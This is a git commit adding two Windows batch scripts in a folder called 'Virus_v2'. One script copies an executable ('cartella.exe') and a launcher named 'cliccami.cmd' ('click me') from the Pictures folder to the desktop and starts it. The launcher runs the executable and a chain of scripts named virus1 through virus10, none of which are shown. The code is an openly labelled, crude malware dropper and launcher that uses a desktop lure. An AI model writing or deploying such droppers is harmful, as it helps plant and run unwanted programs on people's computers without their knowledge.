58b6dd48d367225b44f790f8484d8e576a8601f1
IlBuonTommy <45892844+IlBuonTommy@users.noreply.github.com>
2018-12-20 13:29:42 +0100

    Add files via upload

---
+++ Virus_v2/virus/cliccami.cmd
@@ -0,0 +1,11 @@
+@echo off
+cartella.exe
+start virus5.cmd
+start virus2.cmd
+start virus1.cmd
+virus4.cmd
+start virus3.cmd
+virus10.cmd
+exit
+
+
---
+++ Virus_v2/virusV.2.cmd
@@ -0,0 +1,7 @@
+@echo off
+cd ..
+copy Pictures\virus\cartella.exe desktop\
+copy Pictures\virus\cliccami.cmd desktop\
+cd desktop
+start cliccami.cmd
+exit
